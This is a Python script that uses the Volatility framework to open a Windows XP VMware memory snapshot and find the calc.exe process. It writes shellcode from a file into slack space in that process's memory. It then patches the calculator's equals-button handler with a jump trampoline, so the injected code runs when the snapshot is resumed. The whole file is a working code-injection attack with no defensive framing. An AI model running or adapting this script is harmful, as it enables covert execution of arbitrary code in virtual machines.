import sys
import struct

equals_button = 0x010115E9
memory_file = "C:\\360downloads\\Windows_XP-Snapshot2.vmem"
slack_space = None
trampoline_offset = None

sc_fd = open("C:\\360downloads\\shellcode.bin","rb")
sc = sc_fd.read()
sc_fd.close()

sys.path.append("C:\\360downloads\\volatility-2.3.1")

import volatility.conf as conf
import volatility.registry as registry
import volatility.commands as commands
import volatility.addrspace as addrspace
import volatility.plugins.taskmods as taskmods

registry.PluginImporter()
config = conf.ConfObject()

registry.register_global_options(config,commands.Command)
registry.register_global_options(config,addrspace.BaseAddressSpace)
config.parse_options()
config.PROFILE = "WinXPSP2x86"
config.LOCATION = "file://%s"%memory_file

p = taskmods.PSList(config)
for process in p.calculate():
    if str(process.ImageFileName) == "calc.exe":
        print("[*]Found calc.exe with PID %d"%process.UniqueProcessId)
        print("[*]Hunting for physical offsets...please wait.")

        address_space = process.get_process_address_space()
        pages = address_space.get_available_pages()

        for page in pages:
            physical = address_space.vtop(page[0])
            if physical is not None:
                if slack_space is None:
                    with open(memory_file,"r+") as fd:
                        fd.seek(physical)
                        buf = fd.read(page[1])
                        try:
                            offset = buf.index("\x00"*len(sc))
                            slack_space = page[0]+offset # the virtual address to inject

                            print("[*]Found good shellcode location!")
                            print("[*]Virtual address:0x%08x"%slack_space)
                            print("[*]Physical address:0x%08x"%(physical+offset))
                            print("injecting code...")
                            fd.seek(physical+offset)
                            fd.write(sc)
                            fd.flush()
                            tramp = "\xbb%s"%struct.pack("<L",page[0]+offset)
                            tramp += "\xff\xe3"

                            if trampoline_offset is not None:
                                break
                        except Exception as e:
                            print(e)
                if page[0]<=equals_button<(page[0]+page[1]-7):
                    print("[*]Found our trampoline target at:0x%08x"%physical)
                    v_offset = equals_button-page[0]
                    trampoline_offset = physical+v_offset
                    print("[*]Found our trampoline target at:0x%08x"%trampoline_offset)
                    if slack_space is not None:
                        break
print("[*]Writing trampoline...")
with open(memory_file,"r+") as f:
    f.seek(trampoline_offset)
    f.write(tramp)
print("[*]Done injecting code.")
